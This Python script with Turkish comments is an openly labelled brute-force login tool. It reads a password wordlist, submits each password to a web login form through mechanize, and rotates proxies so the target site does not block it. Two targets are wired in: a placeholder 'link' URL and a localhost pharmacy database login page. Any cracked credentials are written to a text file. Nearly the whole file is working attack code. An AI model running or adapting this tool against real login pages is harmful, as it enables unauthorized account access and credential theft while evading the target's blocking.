from colorama import Fore, Back
# Terminali renklendirmemizi sağlayan kütüphane

import mechanize
# Web sitelerinde login işlemleri yapmamızı sağlayan kütüphane

import sys
# Programı durdurmak, ekrana çıktı vermek gibi
# basit işlemleri yapmamızı sağlar.

from proxylist import ProxyList
# Atak yaptığımız siteden, block yememek için kullandığımız kütüphane

import logging
# Proxy listesi için kullandığımız kütüphane

import io
# Dosya işlemleri için kullandığımız kütüphane

print("\n ）︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶︶（")
print(" ）----------------------------------------（")
print(" ）           Brute-Force Attack           （")
print(" ）           ------------------           （")
print(f" ）               {Fore.BLUE}Enes Albayrak{Fore.RESET}              （")
print(" ）︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵︵（")
# Ufak bir acilis ekrani.
print("\n-------------------------------------------------")

b = mechanize.Browser()
# Browser nesnesi oluşturuldu
b.set_handle_equiv(True)
b.set_handle_gzip(True)
b.set_handle_redirect(True)
b.set_handle_referer(True)
b.set_handle_robots(False)
# Giriş yaparken karşımıza çıkan "ben robot değilim"
# gibi sorunları aşmak için ayarlamalar yapıyoruz.
b._factory.is_html = True

b.addheaders = [('User-agent',
                 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/90.0.4430.212 Safari/537.36'
                 )]
# Browser kimliğini tanımlıyoruz -> useragentstring.com

print("[A] LINK")
print("[B] ECZANE DB")
secim = input("SECIM    = ")
print("-------------------------------------------------\n")
kullaniciadi = input(f"{Fore.YELLOW}E-Posta/Kullanıcı Adı = {Fore.RESET}")
sifreDosyasi = input(f"{Fore.YELLOW}Sifre Dosyası         = {Fore.RESET}")
proxyList = input(f"{Fore.YELLOW}Proxy Dosyası         = {Fore.RESET}")
print("-------------------------------------------------\n")


def proxy():
    logging.basicConfig()
    pl = ProxyList()
    try:
        pl.load_file(proxyList)
    except:
        sys.exit("Hatalı dosya !")
    pl.random()
    getProxy = pl.random().address()
    b.set_proxies(proxies={"https": getProxy})
    try:
        checkProxyIP = b.open("https://api.ipify.org/?format=raw", timeout=10)
    except:
        return proxy()


def bruteforce1():
    sifre = open(sifreDosyasi).read().splitlines()
    try_login = 0
    print(f"{Back.YELLOW}{Fore.BLACK}!! ATAK BASLADI !!{Fore.RESET}{Back.RESET}\n")
    for sifre in sifre:
        try_login += 1
        if try_login == 5:
            try_login = 0
        sys.stdout.write('\r[-] {} [-] '.format(sifre))
        sys.stdout.flush()
        adres = "link"
        try:
            b.open(adres, timeout=10)
            b.select_form(nr=0)
            b.form['name'] = kullaniciadi
            b.form['pass'] = sifre
            b.method = "POST"
            submit = b.submit()

            if submit.geturl() == "link":
                print(f"{Back.GREEN}SIFRE BULUNDU = "+sifre+f"{Back.RESET}")
                kaydet = io.open("1.txt", "a").write("Kullanıcı Adı:" + kullaniciadi + "\t\tSifre:" + sifre + "\n")
                break
            else:
                print(f"{Back.RED}ESLESMEDI{Back.RESET}\n")
        except :
            print(f'{Back.MAGENTA}BAGLANTI HATASI !{Back.RESET}\n')
            sys.stdout.flush()
            break

def db():
    sifre = open(sifreDosyasi).read().splitlines()
    try_login = 0
    print(f"{Back.YELLOW}{Fore.BLACK}!! ATAK BASLADI !!{Fore.RESET}{Back.RESET}\n")
    for sifre in sifre:
        try_login += 1
        if try_login == 5:
            try_login = 0
        sys.stdout.write('\r[-] {} [-] '.format(sifre))
        sys.stdout.flush()
        adres = "http://localhost/kodlar/anasayfa1.php"
        try:
            b.open(adres, timeout=2)
            b.select_form(nr=0)
            b.form['kullanici'] = kullaniciadi
            b.form['pass'] = sifre
            b.method = "POST"
            submit = b.submit()

            if submit.geturl() == "http://localhost/kodlar/anasayfa2.php":
                print(f"{Back.GREEN}SIFRE BULUNDU = "+sifre+f"{Back.RESET}")
                kaydet = io.open("eczanedb.txt", "a").write("Kullanıcı Adı:" + kullaniciadi + "\t\tSifre:" + sifre + "\n")
                break
            else:
                print(f"{Back.RED}ESLESMEDI{Back.RESET}\n")
        except :
            print(f'{Back.MAGENTA}BAGLANTI HATASI !{Back.RESET}\n')
            sys.stdout.flush()
            break

if __name__ == '__main__':
    if secim == "a" or secim == "A":
        bruteforce1()
        proxy()
    elif secim == "b" or secim == "B":
        db()
        proxy()
    else:
        print("HATALI GIRIS")